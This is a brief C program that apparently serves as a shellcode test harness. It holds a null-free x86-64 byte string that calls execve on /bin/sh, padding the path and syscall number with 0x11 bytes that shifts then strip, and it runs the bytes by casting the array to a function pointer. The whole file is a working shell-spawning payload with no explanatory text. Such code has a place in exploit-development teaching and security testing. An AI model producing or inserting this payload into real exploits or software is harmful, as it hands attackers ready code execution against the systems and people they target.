#include <unistd.h>

char shellcode[] = 
"\x48\x31\xd2\x48\x31\xf6\x48\xbf"
"\x2f\x62\x69\x6e\x2f\x73\x68\x11"
"\x48\xc1\xe7\x08\x48\xc1\xef\x08"
"\x57\x48\x89\xe7\x48\xb8\x3b\x11"
"\x11\x11\x11\x11\x11\x11\x48\xc1"
"\xe0\x38\x48\xc1\xe8\x38\x0f\x05";

int main(int argc, char ** argv) {
        void (*fp)();
        fp = (void(*)())shellcode;
        (void)(*fp)();

        return 0;
}